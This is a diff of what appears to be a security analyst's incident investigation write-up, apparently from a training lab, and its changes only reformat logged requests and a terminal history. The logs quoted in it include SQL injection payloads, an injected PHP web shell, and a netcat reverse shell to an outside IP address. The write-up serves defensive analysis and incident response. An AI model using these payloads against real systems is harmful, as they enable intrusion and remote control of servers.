@@ -42,25 +42,25 @@ At this point I am fairly confident that this was a malicious attempt, what rais
 
 Request URL: https://172.16.20.6/userNumber=' OR '' = '
 Response Code: 500
-
+<br/>
 Request URL: https://172.16.20.6/userNumber=' union select 1, '<?php system($_GET['cmd']); ?>' into outf...
 Response Code: 200
-
+<br/>
 Request URL: https://172.16.20.6/userNumber=-1 UNION SELECT 1 INTO @,@
 Response Code: 500
-
+<br/>
 Request URL: https://172.16.20.6/cmd.php?cmd=whoami
 Response Code: 200
-
+<br/>
 Request URL: https://172.16.20.6/userNumber=1 AND (SELECT * FROM Users) = 1
 Response Code: 500
-
+<br/>
 Request URL: https://172.16.20.6/cmd.php?cmd=id
 Response Code: 200
-
+<br/>
 Request URL: https://172.16.20.6/userNumber=AND true
 Response Code: 500
-
+<br/>
 Request URL: https://172.16.20.6/cmd.php?cmd=nc 101.32.223.119 1234 -e /bin/sh
 
 I'm positive this is not a false positive case but I still want to try to find the scope. To prevent further spread I'm going to isolate the affected server from the network as well as check command history as the most recent request url started a netcat session that is allowing a remote shell to becon out to the malicious ip address located at 101.32.223.119.
@@ -68,20 +68,33 @@ I'm positive this is not a false positive case but I still want to try to find t
 I navigated to the endpoint security section to contain the 172.16.20.6 (SQLServer) endpoint.
 Once host was contained I looked at the terminal history and it is as follows:
 
-2021-04-17 17:10 :pwd
-2021-04-17 17:12 :ls
-2021-04-17 18:12 :mkdir tempDb
-2021-04-17 18:54 :cd tempDb
-2021-04-17 18:55 :git clone https://github.com/postgres/postgres
-2021-04-18 09:12 :apt-get update
-2021-04-18 09:13 :sudo apt-get install wget ca-certificates
-2021-04-18 09:14 :wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc
-2021-04-18 09:15 :sudo apt-get install postgresql postgresql-contrib
-2021-04-18 13:01 :whoami
-2021-04-18 13:02 :id
-2021-04-18 13:05 :nc 101.32.223.119 1234 -e /bin/sh
-2021-04-18 15:01 :apt show postgresql
-2021-04-18 15:02 :sudo apt install postgresql postgresql-contrib
+2021-04-17 17:10 : pwd
+<br/>
+2021-04-17 17:12 : ls
+<br/>
+2021-04-17 18:12 : mkdir tempDb
+<br/>
+2021-04-17 18:54 : cd tempDb
+<br/>
+2021-04-17 18:55 : git clone https://github.com/postgres/postgres
+<br/>
+2021-04-18 09:12 : apt-get update
+<br/>
+2021-04-18 09:13 : sudo apt-get install wget ca-certificates
+<br/>
+2021-04-18 09:14 : wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc
+<br/>
+2021-04-18 09:15 : sudo apt-get install postgresql postgresql-contrib
+<br/>
+2021-04-18 13:01 : whoami
+<br/>
+2021-04-18 13:02 : id
+<br/>
+2021-04-18 13:05 : nc 101.32.223.119 1234 -e /bin/sh
+<br/>
+2021-04-18 15:01 : apt show postgresql
+<br/>
+2021-04-18 15:02 : sudo apt install postgresql postgresql-contrib
 
 These commands ran shown a clear attack taking place, and attempt to exfil data. They created a temporary storage to move data to (tempDB) and downloaded postgress as well as installed dependencies. The nc (netcat) command is to establish persistance and the following commands are to use postgresql to mainpulate sql data.
 
